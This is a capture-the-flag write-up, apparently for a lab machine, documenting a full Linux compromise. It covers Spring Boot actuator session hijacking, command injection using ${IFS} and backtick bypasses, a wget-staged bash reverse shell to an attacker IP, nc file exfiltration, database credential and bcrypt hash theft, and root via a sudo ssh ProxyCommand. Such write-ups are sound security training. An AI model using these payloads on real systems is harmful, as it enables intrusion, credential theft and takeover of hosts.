
**Date**: 2026-05-01
**Difficulty**: Easy
**OS**: Linux
**Tags**: #spring-boot #actuator #command-injection #postgresql #bcrypt #sudo-ssh

## TL;DR

22/80 → website → Spring Boot whitelabel error → /actuator/sessions → kanderson's session → cmd injection in admin SSH field (filter bypass: ${IFS} + backticks) → reverse shell as `app` → JAR file loot (PostgreSQL creds in application.properties) → PostgreSQL dump → bcrypt hash for admin/josh → su josh → sudo -l → GTFOBins ssh exploit → root
## Recon

### Nmap

1. `sudo nmap -p- --min-rate=5000 -T4 10.129.229.88 -oN ports.txt`
2. `sudo nmap -p 22,80,8080 -sC -sV -T4 10.129.229.88 -oA detailed`
	Open ports:
	+ 22/tcp - SSH (OpenSSH 8.9p1)
	+ 80/tcp - Nginx (1.18.0)

3. ``sudo nmap -sU --top-ports 100 -T4 10.129.229.88
	Nothing found
### Web

+ Default page redirect to http://cozyhosting.htb
+ Added to `/etc/hosts`
+ Login page at `/login`
+ Whitelabel error page at `/error` → **Spring Boot**
+ JSESSIONID is on all pages
### Directory bruteforce

`ffuf -w /usr/share/wordlists/dirb/common.txt -u http://cozyhosting.htb/FUZZ`
```
admin                   [Status: 401]  
error                   [Status: 500]  
index                   [Status: 200]  
login                   [Status: 200]  
logout                  [Status: 204]
```

Nothing critical from dirbusting alone.

### Spring Boot

After identifying Spring Boot, checked for actuator misconfiguration. `/actuator` returned:
```
{"_links":{"self":{"href":"http://localhost:8080/actuator","templated":false},"sessions":{"href":"http://localhost:8080/actuator/sessions","templated":false},"beans":{"href":"http://localhost:8080/actuator/beans","templated":false},"health-path":{"href":"http://localhost:8080/actuator/health/{*path}","templated":tr  
ue},"health":{"href":"http://localhost:8080/actuator/health","templated":false},"env":{"href":"http://localhost:8080/actuator/env","templated":false},"env-toMatch":{"href":"http://localhost:8080/actuator/env/{toMatch}","templated":true},"mappings":{"href":"http://localhost:8080/actuator/mappings","templated":false}  
}}
```

The `/actuator/sessions` endpoint exposed session IDs:
```
{"73F5C0EEB39D62DE881324DA1FFF97F8":"UNAUTHORIZED","ED37D7B7D2647107F2EB2139CF5E6FE6":"kanderson","D96B87C69FEE5EED91A8E60E113DC173":"kanderson"} 
```                                                                

### Session Hijacking

Authentication uses `JSESSIONID` cookie. Took valid session ID from actuator dump: ```
```
JSESSIONID=ED37D7B7D2647107F2EB2139CF5E6FE6 
```

Replaced cookie in browser via DevTools (Application → Cookies → cozyhosting.htb), refreshed page → logged in as `kanderson` with admin panel access. 

Admin panel has only 1 function: **connecting to a remote host**

## Foothold — Command Injection

### Vulnerable Endpoint

Admin panel had "Add Host" feature. The form takes `host` and `username` parameters and runs `ssh username@host` server-side.

- `host` field — must be valid IP (likely validated)
- `username` field — vulnerable to command injection
### Filter Discovery

Tested various payloads to map filters:

| Payload    | Result                              |
| ---------- | ----------------------------------- |
| `;id`      | Filtered — no execution             |
| `\|id`     | Filtered                            |
| `&&id`     | Filtered                            |
| `` `id` `` | **Worked** — backticks not filtered |

Test payload that confirmed RCE:
```
username=ababa `id`
```

Response contained: `uid=1000(app)

RCE confirmed as user `app`.
### Space Filter Bypass

Spaces in payload caused issues - application either filters them or breaks command on first whitespace. Direct bash reverse shell payloads failed because they contain spaces.

**Bypass**: use `${IFS}` (Internal Field Separator) which expands to space at bash execution but passes the filter as literal text.
### Reverse Shell via Staged File

Direct inline reverse shell (`bash -i >& /dev/tcp/...`) failed due to multiple filters (spaces, quotes, redirects) → try to upload it as `shell.sh` and run remotely.

1. Create shell script on attacker machine:
```
echo 'bash -i >& /dev/tcp/10.10.17.151/4444 0>&1' > shell.sh
```

2. Host file via Python HTTP server:
```
python3 -m http.server 8000
```

3. Start listener: `nc -lvnp 4444

4. Download script via injection (using `${IFS}` for spaces):
```
username=a`wget${IFS}http://10.10.17.151:8000/shell.sh${IFS}-O${IFS}/tmp/shell.sh`
```

5. Execute downloaded script:
```
username=a`bash${IFS}/tmp/shell.sh`
```

I got reverse shell as `app` user.

### Shell Stabilization

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## Lateral Movement

### Loot from JAR file

Found `cloudhosting-0.0.1.jar` in `/app/` directory — Spring Boot applications often have hardcoded DB credentials in `application.properties`.

1. Transfer JAR via netcat:

On Kali (receiver):
```
bash
nc -lvnp 9001 > cloudhosting.jar
```

On target:
```
nc 10.10.17.151 9001 < /app/cloudhosting.jar
```

2. Extract JAR (it's a ZIP archive):
```
unzip cloudhosting.jar -d cloudhosting/
```

3. Find configuration file:
```
find cloudhosting/ -name "application.properties"
cat cloudhosting/BOOT-INF/classes/application.properties
```

Found PostgreSQL credentials:
```
server.address=127.0.0.1  
server.servlet.session.timeout=5m  
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings  
management.endpoint.sessions.enabled = true  
spring.datasource.driver-class-name=org.postgresql.Driver  
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect  
spring.jpa.hibernate.ddl-auto=none  
spring.jpa.database=POSTGRESQL  
spring.datasource.platform=postgres  
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting  
spring.datasource.username=postgres  
spring.datasource.password=Vg&nvzAQ7XxR
```

### PostgreSQL dump

1. Connect to database:  ``PGPASSWORD='Vg&nvzAQ7XxR' psql -U postgres -h localhost -d cozyhosting
2. List tables: `\dt`→ Found `users` table.
3. Dump users: ``SELECT * FROM users;
```
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

**Issue**: admin's hash appeared truncated (59 chars instead of 60 expected for bcrypt). Default psql output formatter truncates long values to fit terminal width.

4. Get clean output using unaligned mode and pager-off:
```
PGPASSWORD='Vg&nvzAQ7XxR' psql -U postgres -h localhost -d cozyhosting -t -A -P pager=off -c "SELECT name, password FROM users;"
```

Flags explained:
- `-t` — tuples only (no headers)
- `-A` — unaligned output (no padding/wrapping)
- `-P pager=off` — disable pager
- `-c "..."` — execute query and exit

Got full 60-char admin hash.
### Hash cracking

Initially tried `hashcat -m 3200`, but failed with "token length exception" because the admin hash was truncated to 59 chars from psql's default output formatter.

After getting the clean 60-char hash via `-t -A` flags, switched to `john`:

```
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Result: **`manchesterunited`** (admin password)

### User pivot

Tested admin's password against system users with shells:

```
cat /etc/passwd | grep /bin/bash
josh:x:1003:1003:,,,:/home/josh:/bin/bash

su josh
Password: manchesterunited

cat /home/josh/user.txt
59ae8c70ac8f4d355162f39a78db5b71
```
## Privilege Escalation

As the first step, checked ``sudo -l``

**Result:** 
```
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

### SSH Sudo Exploitation

Two methods to abuse `(root) /usr/bin/ssh *`:

1. File read (limited but quick):``sudo ssh -o ProxyCommand='cat /root/root.txt' x
	Reads any file as root, but no shell.

2. Full root shell (preferred): ``sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
	Spawns interactive shell as root.

```
id
uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
6ace314ca42f03130dec689b2c3cf4b9
```
## Lessons Learned

**Spring Boot specific**:
- Whitelabel Error Page = Spring Boot signature
- Actuator endpoints (`/sessions`, `/env`, `/heapdump`, `/mappings`) often misconfigured on production
- JAR files = ZIP archives → always check `BOOT-INF/classes/application.properties` for hardcoded creds

**Command injection**:
- Test RCE with \`id\` BEFORE attempting reverse shell
- `${IFS}` bypasses space filters (expands to space at execution, but text-only at filter level)
- Backticks vs `;` vs `|` — different operators, different filter bypass profiles
- Stage payloads via wget/curl when inline payload too complex due to filters

**PostgreSQL**:
- `psql -t -A -P pager=off -c "QUERY"` for clean scriptable output
- Default psql output truncates long values → bcrypt hashes get cut off

**Cracking**:
- bcrypt mode in hashcat: `-m 3200`
- bcrypt format in john: `--format=bcrypt`
- Always verify hash length before cracking (bcrypt = 60 chars)

**Privilege Escalation**:
- `sudo -l` is the FIRST command after lateral movement, always
- Wildcard `*` in sudo permission = arbitrary args = likely abuse
- GTFOBins for any binary listed in sudoers
- Reading root.txt ≠ root proof for OSCP (need `id` showing uid=0)

## Where I Got Stuck

1. **Spring Boot identification** — didn't recognize "Whitelabel Error Page" initially. Wasted 20+ min on directory bruteforcing before checking framework.

2. **Base64 reverse shell** — spent ~30 min on broken payloads:
   - Didn't understand `+` in base64 = space when URL-decoded
   - Tried changing ports to "avoid" `+` instead of URL-encoding
   - Skipped basic RCE test (\`id\`) and went straight to reverse shell

3. **Pipe filtering** — kept trying `| base64 -d | bash` patterns when pipes were filtered. Should've fingerprinted filters first with single-character tests.

4. **Hash truncation** — assumed psql output was clean, lost time with hashcat token-length errors before finding `-t -A` flags.

5. **File transfer via nc** — forgot syntax (`>` for receiver, `<` for sender), had to look up.

## Time Spent
~5-6 hours total. Significant assistance on `${IFS}` bypass, JAR extraction methodology, and nc file transfer syntax.

## Next Time

- Always test RCE with `\`id\`` BEFORE attempting any reverse shell
- Fingerprint filters with single-char payloads (`;`, `|`, `&`, space, quote) BEFORE complex payloads
- Read `application.properties` immediately after finding a JAR — don't wait
- Use `psql -c` with `-t -A` flags for **all** database queries in writeup-friendly format